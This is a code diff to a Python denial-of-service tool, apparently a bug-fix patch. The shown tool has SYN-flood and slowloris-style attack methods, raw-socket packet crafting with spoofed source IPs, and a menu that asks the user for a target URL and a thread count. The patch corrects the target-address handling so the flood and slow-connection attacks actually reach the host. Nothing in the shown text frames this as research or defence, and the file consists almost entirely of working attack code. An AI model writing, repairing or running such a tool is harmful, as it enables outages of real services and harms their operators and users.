@@ -20,6 +20,7 @@ class DDoSAttack:
         self.target_url = target_url
         self.threads = threads
         self.attack_num = 0
+        self.target_domain = urlparse(target_url).netloc
 
     def start(self):
         print(f"Starting attack on {self.target_url}")
@@ -65,7 +66,7 @@ class DDoSAttack:
 
             sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)
             sock.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
-            sock.sendto(packet, (self.target_url, 0))  # Use URL directly (usually not recommended)
+            sock.sendto(packet, (self.target_domain, 0))
             print(Fore.GREEN + "SYN Flood packet sent!" + Style.RESET_ALL)
         except KeyboardInterrupt:
             print("SYN Flood stopped.")
@@ -75,7 +76,7 @@ class DDoSAttack:
     def pyslow(self):
         try:
             sock = socket(AF_INET, SOCK_STREAM)
-            sock.connect((self.target_url, 80))  # Use URL directly (usually not recommended)
+            sock.connect((self.target_domain, 80))
             sock.send(b'GET / HTTP/1.1\r\n')
             time.sleep(5)
             print(Fore.GREEN + "Pyslow connection established!" + Style.RESET_ALL)
@@ -98,7 +99,7 @@ class DDoSAttack:
         protocol = IPPROTO_TCP
         check = 10
         s_addr = inet_aton(self.fake_ip())
-        d_addr = inet_aton(self.target_url)  # Use URL directly (usually not recommended)
+        d_addr = inet_aton(self.target_domain)
         ihl_version = (version << 4) + ihl
         return pack('!BBHHHBBH4s4s', ihl_version, tos, tot, id, frag_off, ttl, protocol, check, s_addr, d_addr)
 
@@ -149,13 +150,13 @@ def menu():
             return
         
         threads = int(input("Enter number of threads: "))
-        target_url = input(Fore.RED + Style.BRIGHT + "Enter target URL: ")
+        target_url = input(Fore.RED + Style.BRIGHT + "Enter target URL: " + Style.RESET_ALL)
 
         attack = DDoSAttack(target_url, threads)
         attack.start()
         
     except ValueError:
-        print("Please enter a valid number.")
+        print(Fore.RED + "Please enter a valid number." + Style.RESET_ALL)
         menu()
 
 if __name__ == "__main__":
